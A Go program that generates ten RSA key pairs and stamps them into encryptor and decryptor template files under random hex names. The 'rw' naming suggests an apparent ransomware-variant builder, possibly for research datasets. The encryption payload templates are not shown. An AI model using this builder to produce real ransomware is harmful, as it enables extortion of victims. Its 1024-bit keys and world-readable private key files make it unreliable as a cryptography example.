package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	r "math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)
const (
	path = "/root/y/"
	dummy_path = "/root/CODES/go/LCJ/modules/KRAM/dummy/"
	hexadecimal = "abcdef0123456789"
	letterIdxBits = 4
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

var src = r.NewSource(time.Now().UnixNano())

func GenerateRsaKeyPair() (*rsa.PrivateKey, *rsa.PublicKey) {
	privkey, _ := rsa.GenerateKey(rand.Reader, 1024)
	return privkey, &privkey.PublicKey
}

func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
	privkey_bytes := x509.MarshalPKCS1PrivateKey(privkey)
	privkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: privkey_bytes,
		},
	)
	return string(privkey_pem)
}

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
	pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
	if err != nil {
		return "", err
	}
	pubkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: pubkey_bytes,
		},
	)

	return string(pubkey_pem), nil
}

func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("Key type is not RSA");
}

func generate_keys(i int, encryptor_name, decryptor_name string)(){

	priv, pub := GenerateRsaKeyPair()

	// Export the keys to pem string
	priv_pem   := ExportRsaPrivateKeyAsPemStr(priv)
	pub_pem, _ := ExportRsaPublicKeyAsPemStr(pub)

	// Import the keys from pem string
	priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)
	pub_parsed, _  := ParseRsaPublicKeyFromPemStr(pub_pem)

	// Export the newly imported keys
	priv_parsed_pem   := ExportRsaPrivateKeyAsPemStr(priv_parsed)
	pub_parsed_pem, _ := ExportRsaPublicKeyAsPemStr(pub_parsed)

	full_path := path + strconv.Itoa(i)

	err := os.Mkdir(full_path, 0755)
	if err != nil {
		log.Fatal(err)
	}

	err = ioutil.WriteFile(full_path+"/6", []byte(priv_parsed_pem), 0644)
	if err != nil {
		fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}
	err = ioutil.WriteFile(full_path+"/9", []byte(pub_parsed_pem), 0644)
	if err != nil {
		fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}

	private_key_byte, err := ioutil.ReadFile(full_path+"/6")
	if err != nil {
		log.Fatalln(err)
	}
	public_key_byte, err := ioutil.ReadFile(full_path+"/9")
	if err != nil {
		log.Fatalln(err)
	}

	encryptor_dummy_path := dummy_path + "encryptor_dummy.go"
	decryptor_dummy_path := dummy_path + "decryptor_dummy.go"

	encryptor, err := ioutil.ReadFile(encryptor_dummy_path)
	if err != nil {
		log.Fatalln(err)
	}
	decryptor, err := ioutil.ReadFile(decryptor_dummy_path)
	if err != nil {
		log.Fatalln(err)
	}

	private_key 	:= string(private_key_byte)
	public_key  	:= string(public_key_byte)
	encryptor_lines := strings.Split(string(encryptor), "\n")
	decryptor_lines := strings.Split(string(decryptor), "\n")

	for i, line := range decryptor_lines {
		if strings.Contains(line, "var priv_pem string") {
			decryptor_lines[i+1] = "\tpriv_pem = \n" + "`" + private_key + "`"
			break
		}
	}

	for i, line := range encryptor_lines {
		if strings.Contains(line, "var public_key string") {
			encryptor_lines[i+1] = "\tpublic_key = \n" + "`" + public_key + "`"
			break
		}
	}

	encrypted_output := strings.Join(encryptor_lines, "\n")
	err = ioutil.WriteFile(full_path+"/6" + encryptor_name + ".go", []byte(encrypted_output), 0644)
	if err != nil {
		log.Fatalln(err)
	}

	decrypted_output := strings.Join(decryptor_lines, "\n")
	err = ioutil.WriteFile(full_path+"/9" + decryptor_name + ".go", []byte(decrypted_output), 0644)
	if err != nil {
		log.Fatalln(err)
	}
}

func generate_random_name(n, len_str int) (string, string) {
	b := make([]byte, n)
	var bin_names []string
	for k := 0; k < len_str; k++{
		for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
			if remain == 0 {
				cache, remain = src.Int63(), letterIdxMax
			}
			if idx := int(cache & letterIdxMask); idx < len(hexadecimal) {
				b[i] = hexadecimal[idx]
				i--
			}
			cache >>= letterIdxBits
			remain--
		}
		bin_names = append(bin_names, string(b))
	}
	return bin_names[0], bin_names[1]
}

func main() {
	rw_name_len := 5
	max_rw := 10
	for i := 1; i<= max_rw; i++ {
		encryptor_name, decryptor_name := generate_random_name(rw_name_len, 2)
		generate_keys(i, encryptor_name, decryptor_name)
	}
}
